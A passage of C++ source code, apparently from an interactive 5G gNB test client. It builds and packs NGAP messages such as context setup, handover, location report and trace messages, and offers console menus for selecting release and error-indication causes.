  transfer.dl_qos_flow_per_tnl_info.associated_qos_flow_list.push_back(qos);
  return transfer;
}

static byte_buffer build_initial_context_setup_response(uint64_t    amf_ue_ngap_id,
                                                        uint64_t    ran_ue_ngap_id,
                                                        uint16_t    pdu_session_id,
                                                        uint32_t    teid,
                                                        std::string transport_layer_address,
                                                        uint8_t     qfi)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_INIT_CONTEXT_SETUP);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.init_context_setup_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->pdu_session_res_setup_list_cxt_res_present = true;

  pdu_session_res_setup_item_cxt_res_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.pdu_session_res_setup_resp_transfer =
      pack_into_pdu(build_pdu_session_resource_setup_response_transfer(transport_layer_address, teid, qfi),
                    "PDUSessionResourceSetupResponseTransfer");
  if (item.pdu_session_res_setup_resp_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceSetupResponseTransfer");
  }
  msg->pdu_session_res_setup_list_cxt_res.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "InitialContextSetupResponse");
}

static byte_buffer
build_ue_radio_capability_info_indication(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, byte_buffer ue_radio_capability)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UE_RADIO_CAP_INFO_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.ue_radio_cap_info_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->ue_radio_cap   = std::move(ue_radio_capability);

  return pack_ngap_message(ngap_msg, "UERadioCapabilityInfoIndication");
}


static byte_buffer
build_initial_context_setup_failure(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, const std::string& cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_unsuccessful_outcome().load_info_obj(ASN1_NGAP_ID_INIT_CONTEXT_SETUP);

  auto& msg            = ngap_msg.pdu.unsuccessful_outcome().value.init_context_setup_fail();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "InitialContextSetupFailure");
}

static byte_buffer build_ue_context_release_complete(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_RELEASE);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.ue_context_release_complete();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;

  return pack_ngap_message(ngap_msg, "UEContextReleaseComplete");
}

static byte_buffer build_ue_context_modification_response(uint64_t    amf_ue_ngap_id,
                                                          uint64_t    ran_ue_ngap_id,
                                                          std::string rrc_state,
                                                          std::string plmn,
                                                          std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_MOD);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.ue_context_mod_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->rrc_state_present = true;
  msg->rrc_state = parse_rrc_state(rrc_state);
  msg->user_location_info_present = true;
  msg->user_location_info = build_user_location_info(plmn, tac);

  return pack_ngap_message(ngap_msg, "UEContextModificationResponse");
}

static byte_buffer build_ue_context_modification_failure(uint64_t           amf_ue_ngap_id,
                                                         uint64_t           ran_ue_ngap_id,
                                                         const std::string& cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_unsuccessful_outcome().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_MOD);

  auto& msg            = ngap_msg.pdu.unsuccessful_outcome().value.ue_context_mod_fail();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "UEContextModificationFailure");
}

static byte_buffer build_rrc_inactive_transition_report(uint64_t    amf_ue_ngap_id,
                                                        uint64_t    ran_ue_ngap_id,
                                                        std::string rrc_state,
                                                        std::string plmn,
                                                        std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_RRC_INACTIVE_TRANSITION_REPORT);

  auto& msg            = ngap_msg.pdu.init_msg().value.rrc_inactive_transition_report();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->rrc_state      = parse_rrc_state(rrc_state);
  msg->user_location_info = build_user_location_info(plmn, tac);

  return pack_ngap_message(ngap_msg, "RRCInactiveTransitionReport");
}

static byte_buffer build_ue_context_suspend_request(uint64_t    amf_ue_ngap_id,
                                                    uint64_t    ran_ue_ngap_id,
                                                    bool        include_user_location,
                                                    std::string plmn,
                                                    std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_SUSPEND);

  auto& msg            = ngap_msg.pdu.init_msg().value.ue_context_suspend_request();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  if (include_user_location) {
    msg->user_location_info_present = true;
    msg->user_location_info = build_user_location_info(plmn, tac);
  }

  return pack_ngap_message(ngap_msg, "UEContextSuspendRequest");
}

static byte_buffer build_ue_context_resume_request(uint64_t    amf_ue_ngap_id,
                                                   uint64_t    ran_ue_ngap_id,
                                                   std::string rrc_resume_cause,
                                                   bool        include_user_location,
                                                   std::string plmn,
                                                   std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_RESUME);

  auto& msg             = ngap_msg.pdu.init_msg().value.ue_context_resume_request();
  msg->amf_ue_ngap_id  = amf_ue_ngap_id;
  msg->ran_ue_ngap_id  = ran_ue_ngap_id;
  msg->rrc_resume_cause = parse_rrc_establishment_cause(rrc_resume_cause);
  if (include_user_location) {
    msg->user_location_info_present = true;
    msg->user_location_info = build_user_location_info(plmn, tac);
  }

  return pack_ngap_message(ngap_msg, "UEContextResumeRequest");
}

static byte_buffer build_ran_cp_relocation_indication(uint64_t    ran_ue_ngap_id,
                                                      uint16_t    amf_set_id,
                                                      uint8_t     amf_pointer,
                                                      std::string five_g_tmsi_hex,
                                                      std::string plmn,
                                                      std::string tac,
                                                      uint32_t    eutra_cell_id,
                                                      uint16_t    ul_nas_mac,
                                                      uint8_t     ul_nas_count)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_RAN_CP_RELOCATION_IND);

  auto& msg = ngap_msg.pdu.init_msg().value.ran_cp_relocation_ind();
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->five_g_s_tmsi.amf_set_id.from_number(amf_set_id);
  msg->five_g_s_tmsi.amf_pointer.from_number(amf_pointer);
  msg->five_g_s_tmsi.five_g_tmsi.from_string(five_g_tmsi_hex);
  msg->eutra_cgi.plmn_id.from_string(plmn);
  msg->eutra_cgi.eutra_cell_id.from_number(eutra_cell_id);
  msg->tai.plmn_id.from_string(plmn);
  msg->tai.tac.from_string(tac);
  msg->ul_cp_security_info.ul_nas_mac.from_number(ul_nas_mac);
  msg->ul_cp_security_info.ul_nas_count.from_number(ul_nas_count);

  return pack_ngap_message(ngap_msg, "RANCPRelocationIndication");
}

static byte_buffer build_pdu_session_resource_modify_response(uint64_t amf_ue_ngap_id,
                                                              uint64_t ran_ue_ngap_id,
                                                              uint16_t pdu_session_id,
                                                              uint8_t  qfi)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_MODIFY);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.pdu_session_res_modify_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->pdu_session_res_modify_list_mod_res_present = true;

  pdu_session_res_modify_resp_transfer_s transfer = {};
  qos_flow_add_or_modify_resp_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.qos_flow_add_or_modify_resp_list.push_back(qos);

  pdu_session_res_modify_item_mod_res_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.pdu_session_res_modify_resp_transfer = pack_into_pdu(transfer, "PDUSessionResourceModifyResponseTransfer");
  if (item.pdu_session_res_modify_resp_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceModifyResponseTransfer");
  }
  msg->pdu_session_res_modify_list_mod_res.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceModifyResponse");
}

static byte_buffer build_pdu_session_resource_modify_indication(uint64_t    amf_ue_ngap_id,
                                                                uint64_t    ran_ue_ngap_id,
                                                                uint16_t    pdu_session_id,
                                                                uint32_t    teid,
                                                                std::string transport_layer_address,
                                                                uint8_t     qfi)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_MODIFY_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.pdu_session_res_modify_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;

  pdu_session_res_modify_ind_transfer_s transfer = {};
  transfer.dl_qos_flow_per_tnl_info.up_transport_layer_info = build_gtp_tunnel(transport_layer_address, teid);
  associated_qos_flow_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.dl_qos_flow_per_tnl_info.associated_qos_flow_list.push_back(qos);

  pdu_session_res_modify_item_mod_ind_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.pdu_session_res_modify_ind_transfer = pack_into_pdu(transfer, "PDUSessionResourceModifyIndicationTransfer");
  if (item.pdu_session_res_modify_ind_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceModifyIndicationTransfer");
  }
  msg->pdu_session_res_modify_list_mod_ind.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceModifyIndication");
}

static byte_buffer build_ue_radio_capability_check_response(uint64_t amf_ue_ngap_id,
                                                            uint64_t ran_ue_ngap_id,
                                                            bool     ims_voice_supported)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_RADIO_CAP_CHECK);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.ue_radio_cap_check_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->ims_voice_support_ind =
      ims_voice_supported ? ims_voice_support_ind_opts::supported : ims_voice_support_ind_opts::not_supported;

  return pack_ngap_message(ngap_msg, "UERadioCapabilityCheckResponse");
}

static event_type_e parse_location_event_type(const std::string& value)
{
  if (value == "change-of-serve-cell") {
    return event_type_opts::change_of_serve_cell;
  }
  if (value == "ue-presence-in-area-of-interest") {
    return event_type_opts::ue_presence_in_area_of_interest;
  }
  if (value == "stop-change-of-serve-cell") {
    return event_type_opts::stop_change_of_serve_cell;
  }
  if (value == "stop-ue-presence-in-area-of-interest") {
    return event_type_opts::stop_ue_presence_in_area_of_interest;
  }
  if (value == "cancel-location-report-for-the-ue") {
    return event_type_opts::cancel_location_report_for_the_ue;
  }
  return event_type_opts::direct;
}

static byte_buffer build_location_report(uint64_t    amf_ue_ngap_id,
                                         uint64_t    ran_ue_ngap_id,
                                         std::string plmn,
                                         std::string tac,
                                         std::string event_type)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_LOCATION_REPORT);

  auto& msg            = ngap_msg.pdu.init_msg().value.location_report();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->user_location_info = build_user_location_info(plmn, tac);
  msg->location_report_request_type.event_type = parse_location_event_type(event_type);
  msg->location_report_request_type.report_area = report_area_opts::cell;

  return pack_ngap_message(ngap_msg, "LocationReport");
}

static byte_buffer
build_location_reporting_failure_indication(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, const std::string& cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_LOCATION_REPORT_FAIL_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.location_report_fail_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "LocationReportingFailureIndication");
}

static byte_buffer
build_handover_notify(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, std::string plmn, std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_HO_NOTIF);

  auto& msg            = ngap_msg.pdu.init_msg().value.ho_notify();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->user_location_info = build_user_location_info(plmn, tac);

  return pack_ngap_message(ngap_msg, "HandoverNotify");
}

static byte_buffer build_uplink_ran_status_transfer(uint64_t amf_ue_ngap_id,
                                                    uint64_t ran_ue_ngap_id,
                                                    uint8_t  drb_id,
                                                    uint32_t ul_hfn,
                                                    uint16_t ul_sn,
                                                    uint32_t dl_hfn,
                                                    uint16_t dl_sn)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UL_RAN_STATUS_TRANSFER);

  auto& msg            = ngap_msg.pdu.init_msg().value.ul_ran_status_transfer();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;

  drbs_subject_to_status_transfer_item_s item = {};
  item.drb_id = drb_id;
  auto& ul12 = item.drb_status_ul.set_drb_status_ul12();
  ul12.ul_count_value.hfn_pdcp_sn12 = ul_hfn;
  ul12.ul_count_value.pdcp_sn12 = ul_sn;
  auto& dl12 = item.drb_status_dl.set_drb_status_dl12();
  dl12.dl_count_value.hfn_pdcp_sn12 = dl_hfn;
  dl12.dl_count_value.pdcp_sn12 = dl_sn;
  msg->ran_status_transfer_transparent_container.drbs_subject_to_status_transfer_list.push_back(item);

  return pack_ngap_message(ngap_msg, "UplinkRANStatusTransfer");
}

static byte_buffer build_uplink_ran_early_status_transfer(uint64_t amf_ue_ngap_id,
                                                          uint64_t ran_ue_ngap_id,
                                                          uint8_t  drb_id,
                                                          uint32_t dl_hfn,
                                                          uint16_t dl_sn)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UL_RAN_EARLY_STATUS_TRANSFER);

  auto& msg            = ngap_msg.pdu.init_msg().value.ul_ran_early_status_transfer();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;

  auto& first_dl = msg->early_status_transfer_transparent_container.proc_stage.set_first_dl_count();
  drbs_subject_to_early_status_transfer_item_s item = {};
  item.drb_id = drb_id;
  auto& dl12 = item.first_dl_count.set_drb_status_dl12();
  dl12.dl_count_value.hfn_pdcp_sn12 = dl_hfn;
  dl12.dl_count_value.pdcp_sn12 = dl_sn;
  first_dl.drbs_subject_to_early_status_transfer.push_back(item);

  return pack_ngap_message(ngap_msg, "UplinkRANEarlyStatusTransfer");
}

static byte_buffer build_ue_radio_capability_id_mapping_response(std::string cap_id_hex, byte_buffer ue_radio_capability)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_RADIO_CAP_ID_MAP);

  auto& msg = ngap_msg.pdu.successful_outcome().value.ue_radio_cap_id_map_resp();
  msg->ue_radio_cap_id.from_string(cap_id_hex);
  msg->ue_radio_cap = std::move(ue_radio_capability);

  return pack_ngap_message(ngap_msg, "UERadioCapabilityIDMappingResponse");
}

static byte_buffer build_secondary_rat_data_usage_report(uint64_t    amf_ue_ngap_id,
                                                         uint64_t    ran_ue_ngap_id,
                                                         uint16_t    pdu_session_id,
                                                         bool        include_ho_flag,
                                                         bool        include_user_location,
                                                         std::string plmn,
                                                         std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_SECONDARY_RAT_DATA_USAGE_REPORT);

  auto& msg            = ngap_msg.pdu.init_msg().value.secondary_rat_data_usage_report();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  if (include_ho_flag) {
    msg->ho_flag_present = true;
    msg->ho_flag = ho_flag_opts::ho_prep;
  }
  if (include_user_location) {
    msg->user_location_info_present = true;
    msg->user_location_info = build_user_location_info(plmn, tac);
  }

  secondary_rat_data_usage_report_transfer_s transfer = {};
  pdu_session_res_secondary_rat_usage_item_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.secondary_rat_data_usage_report_transfer = pack_into_pdu(transfer, "SecondaryRATDataUsageReportTransfer");
  if (item.secondary_rat_data_usage_report_transfer.empty()) {
    throw std::runtime_error("Failed to pack SecondaryRATDataUsageReportTransfer");
  }
  msg->pdu_session_res_secondary_rat_usage_list.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "SecondaryRATDataUsageReport");
}

static byte_buffer
build_trace_failure_indication(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, std::string trace_id_hex, std::string cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_TRACE_FAIL_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.trace_fail_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->ngran_trace_id.from_string(trace_id_hex);
  msg->cause = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "TraceFailureIndication");
}

static byte_buffer build_cell_traffic_trace(uint64_t    amf_ue_ngap_id,
                                            uint64_t    ran_ue_ngap_id,
                                            std::string trace_id_hex,
                                            std::string plmn,
                                            std::string transport_layer_address,
                                            bool        privacy_immediate_mdt)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_CELL_TRAFFIC_TRACE);

  auto& msg            = ngap_msg.pdu.init_msg().value.cell_traffic_trace();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->ngran_trace_id.from_string(trace_id_hex);
  auto& nr_cgi = msg->ngran_cgi.set_nr_cgi();
  nr_cgi.plmn_id.from_string(plmn);
  nr_cgi.nr_cell_id.from_number(
      nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());
  msg->trace_collection_entity_ip_address.from_string(ipv4_to_bit_string(transport_layer_address));
  msg->privacy_ind_present = true;
  msg->privacy_ind = privacy_immediate_mdt ? privacy_ind_opts::immediate_mdt : privacy_ind_opts::logged_mdt;

  return pack_ngap_message(ngap_msg, "CellTrafficTrace");
}

static std::string join_strings(const std::vector<std::string>& values, const char* separator)
{
  std::string result;
  for (unsigned i = 0; i != values.size(); ++i) {
    if (i != 0) {
      result += separator;
    }
    result += values[i];
  }
  return result;
}

static std::string sockaddr_to_string(const sockaddr& addr, socklen_t addr_len)
{
  const auto info = get_nameinfo(addr, addr_len);
  return info.address + ":" + std::to_string(info.port);
}

static socklen_t sockaddr_len(const sockaddr_storage& addr)
{
  return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET ? sizeof(sockaddr_in) : sizeof(sockaddr_in6);
}

static std::vector<sockaddr_storage>
resolve_sctp_addresses(const std::vector<std::string>& addresses, int port, ocudulog::basic_logger& logger)
{
  std::vector<sockaddr_storage> resolved_addrs;
  for (const auto& addr : addresses) {
    sockaddr_searcher searcher{addr, port, logger};
    for (struct addrinfo* result = searcher.next(); result != nullptr; result = searcher.next()) {
      sockaddr_storage storage = {};
      std::memcpy(&storage, result->ai_addr, result->ai_addrlen);
      resolved_addrs.emplace_back(storage);
    }
  }

  std::sort(resolved_addrs.begin(), resolved_addrs.end(), sockaddr_storage_less{});
  auto last = std::unique(resolved_addrs.begin(), resolved_addrs.end(), sockaddr_storage_equal);
  resolved_addrs.erase(last, resolved_addrs.end());
  return resolved_addrs;
}

static bool has_ipv6_address(const std::vector<sockaddr_storage>& addresses)
{
  return std::any_of(addresses.begin(), addresses.end(), [](const sockaddr_storage& addr) {
    return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET6;
  });
}

static void keep_compatible_destinations(std::vector<sockaddr_storage>& destinations, int socket_family)
{
  if (socket_family != AF_INET) {
    return;
  }
  destinations.erase(std::remove_if(destinations.begin(),
                                    destinations.end(),
                                    [](const sockaddr_storage& addr) {
                                      return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET6;
                                    }),
                     destinations.end());
}

static std::vector<std::string> get_peer_addresses(int fd, sctp_assoc_t assoc_id)
{
  std::vector<std::string> peer_addresses;
  struct sockaddr*        paddrs = nullptr;

  const int paddr_count = ::sctp_getpaddrs(fd, assoc_id, &paddrs);
  if (paddr_count <= 0 || paddrs == nullptr) {
    return peer_addresses;
  }

  const sockaddr* current = paddrs;
  for (int i = 0; i != paddr_count; ++i) {
    if (current->sa_family != AF_INET && current->sa_family != AF_INET6) {
      break;
    }
    const socklen_t peer_len = current->sa_family == AF_INET ? sizeof(sockaddr_in) : sizeof(sockaddr_in6);
    peer_addresses.push_back(sockaddr_to_string(*current, peer_len));
    current = reinterpret_cast<const sockaddr*>(reinterpret_cast<const uint8_t*>(current) + peer_len);
  }
  ::sctp_freepaddrs(paddrs);

  return peer_addresses;
}

static std::string get_local_endpoint(int fd)
{
  sockaddr_storage local_addr     = {};
  socklen_t        local_addr_len = sizeof(local_addr);
  if (::getsockname(fd, reinterpret_cast<sockaddr*>(&local_addr), &local_addr_len) != 0) {
    return "unknown";
  }
  return sockaddr_to_string(*reinterpret_cast<sockaddr*>(&local_addr), local_addr_len);
}

static void dump_hex(const byte_buffer& pdu)
{
  for (uint8_t byte : pdu) {
    std::printf("%02x", byte);
  }
  std::printf("\n");
}

static std::string get_message_type(const ngap_pdu_c& pdu)
{
  switch (pdu.type().value) {
    case ngap_pdu_c::types_opts::init_msg:
      return pdu.init_msg().value.type().to_string();
    case ngap_pdu_c::types_opts::successful_outcome:
      return pdu.successful_outcome().value.type().to_string();
    case ngap_pdu_c::types_opts::unsuccessful_outcome:
      return pdu.unsuccessful_outcome().value.type().to_string();
    default:
      return "unknown";
  }
}

static std::string describe_ngap_pdu(const byte_buffer& pdu)
{
  asn1::cbit_ref bref(pdu);
  ngap_message   msg = {};
  if (msg.pdu.unpack(bref) != asn1::OCUDUASN_SUCCESS) {
    return "decode-failed";
  }
  return get_message_type(msg.pdu);
}

static bool is_downlink_nas_authentication_reject(const byte_buffer& pdu)
{
  asn1::cbit_ref bref(pdu);
  ngap_message   msg = {};
  if (msg.pdu.unpack(bref) != asn1::OCUDUASN_SUCCESS) {
    return false;
  }
  if (msg.pdu.type().value != ngap_pdu_c::types_opts::init_msg ||
      msg.pdu.init_msg().value.type().value != ngap_elem_procs_o::init_msg_c::types_opts::dl_nas_transport) {
    return false;
  }

  const auto& nas_pdu = msg.pdu.init_msg().value.dl_nas_transport()->nas_pdu;
  const auto  nas_hex = nas_pdu.to_string();
  return nas_hex.size() >= 6 && nas_hex.rfind("7e00", 0) == 0 && nas_hex.substr(4, 2) == "58";
}

static bool parse_uint64(const std::string& token, uint64_t& value)
{
  if (token.empty()) {
    return false;
  }

  char* end = nullptr;
  errno     = 0;
  const auto parsed = std::strtoull(token.c_str(), &end, 0);
  if (errno != 0 || end == token.c_str() || *end != '\0') {
    return false;
  }

  value = static_cast<uint64_t>(parsed);
  return true;
}

static std::string trim_copy(const std::string& value)
{
  const auto first = std::find_if_not(value.begin(), value.end(), [](unsigned char c) { return std::isspace(c); });
  const auto last  = std::find_if_not(value.rbegin(), value.rend(), [](unsigned char c) { return std::isspace(c); });
  if (first == value.end()) {
    return {};
  }
  return std::string(first, last.base());
}

static bool read_line(const char* prompt, std::string& line)
{
  std::printf("%s", prompt);
  std::fflush(stdout);
  return static_cast<bool>(std::getline(std::cin, line));
}

static bool is_quit_command(const std::string& line)
{
  return line == "q" || line == "quit" || line == "exit";
}

struct radio_network_cause_option {
  const char*                  label;
  ngap_cause_radio_network_t   cause;
};

struct error_indication_cause_option {
  const char* label;
  const char* cause_name;
};

static const std::vector<radio_network_cause_option>& ue_context_release_cause_options()
{
  static const std::vector<radio_network_cause_option> options = {
      {"successful-handover", ngap_cause_radio_network_t::successful_ho},
      {"release-due-to-ngran-generated-reason", ngap_cause_radio_network_t::release_due_to_ngran_generated_reason},
      {"release-due-to-5gc-generated-reason", ngap_cause_radio_network_t::release_due_to_5gc_generated_reason},
      {"user-inactivity", ngap_cause_radio_network_t::user_inactivity},
      {"radio-connection-with-ue-lost", ngap_cause_radio_network_t::radio_conn_with_ue_lost},
      {"radio-resources-not-available", ngap_cause_radio_network_t::radio_res_not_available},
      {"failure-in-radio-interface-procedure", ngap_cause_radio_network_t::fail_in_radio_interface_proc},
      {"interaction-with-other-procedure", ngap_cause_radio_network_t::interaction_with_other_proc},
      {"unknown-local-UE-NGAP-ID", ngap_cause_radio_network_t::unknown_local_ue_ngap_id},
      {"inconsistent-remote-UE-NGAP-ID", ngap_cause_radio_network_t::inconsistent_remote_ue_ngap_id},
      {"unspecified", ngap_cause_radio_network_t::unspecified}};
  return options;
}

static const std::vector<error_indication_cause_option>& non_ue_error_indication_cause_options()
{
  static const std::vector<error_indication_cause_option> options = {
      {"release-due-to-ngran-generated-reason", "release-due-to-ngran-generated-reason"},
      {"release-due-to-5gc-generated-reason", "release-due-to-5gc-generated-reason"},
      {"failure-in-radio-interface-procedure", "failure-in-radio-interface-procedure"},
      {"interaction-with-other-procedure", "interaction-with-other-procedure"},
      {"radio-resources-not-available", "radio-resources-not-available"},
      {"cell-not-available", "cell-not-available"},
      {"unknown-target-id", "unknown-target-id"},
      {"unspecified", "unspecified"}};
  return options;
}

static const std::vector<error_indication_cause_option>& ue_error_indication_cause_options()
{
  static const std::vector<error_indication_cause_option> options = {
      {"unknown-local-UE-NGAP-ID", "unknown-local-UE-NGAP-ID"},
      {"inconsistent-remote-UE-NGAP-ID", "inconsistent-remote-UE-NGAP-ID"},
      {"radio-connection-with-ue-lost", "radio-connection-with-ue-lost"},
      {"release-due-to-ngran-generated-reason", "release-due-to-ngran-generated-reason"},
      {"release-due-to-5gc-generated-reason", "release-due-to-5gc-generated-reason"},
      {"user-inactivity", "user-inactivity"},
      {"failure-in-radio-interface-procedure", "failure-in-radio-interface-procedure"},
      {"interaction-with-other-procedure", "interaction-with-other-procedure"},
      {"unknown-pdu-session-id", "unknown-pdu-session-id"},
      {"unknown-qos-flow-id", "unknown-qos-flow-id"},
      {"unspecified", "unspecified"}};
  return options;
}

static const char* get_radio_network_cause_label(ngap_cause_radio_network_t cause)
{
  for (const auto& option : ue_context_release_cause_options()) {
    if (option.cause == cause) {
      return option.label;
    }
  }
  return "unknown";
}

static std::optional<ngap_cause_radio_network_t> read_ue_context_release_cause()
{
  const auto& options = ue_context_release_cause_options();
  while (true) {
    std::printf("\nSelect UEContextReleaseRequest cause [default=1]:\n");
    for (size_t i = 0; i != options.size(); ++i) {
      std::printf("  %zu) %s\n", i + 1, options[i].label);
    }
    std::printf("  q) quit\n");

    std::string line;
    if (!read_line("Cause selection: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);
    if (line.empty()) {
      return options.front().cause;
    }
    if (is_quit_command(line)) {
      return std::nullopt;
    }

    uint64_t value = 0;
    if (parse_uint64(line, value) && value >= 1 && value <= options.size()) {
      return options[value - 1].cause;
    }
    std::printf("Invalid cause selection. Enter 1..%zu or q.\n", options.size());
  }
}

static std::optional<std::string> read_error_indication_cause(bool ue_associated)
{
  const auto& options = ue_associated ? ue_error_indication_cause_options() : non_ue_error_indication_cause_options();
  while (true) {
    std::printf("\nSelect %s ErrorIndication cause [default=1]:\n", ue_associated ? "UE-associated" : "non-UE-associated");
    for (size_t i = 0; i != options.size(); ++i) {
      std::printf("  %zu) %s\n", i + 1, options[i].label);
    }
    std::printf("  q) quit\n");

    std::string line;
    if (!read_line("Cause selection: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);
    if (line.empty()) {
      return std::string(options.front().cause_name);
    }
    if (is_quit_command(line)) {
      return std::nullopt;
    }

    uint64_t value = 0;
    if (parse_uint64(line, value) && value >= 1 && value <= options.size()) {
      return std::string(options[value - 1].cause_name);
    }
    std::printf("Invalid cause selection. Enter 1..%zu or q.\n", options.size());
  }
}

template <typename T>
static std::string default_to_string(const T& value)
{
  std::ostringstream os;
  os << value;
  return os.str();
}

template <typename T>
T get_input_or_default(const std::string& prompt, const T& default_value)
{
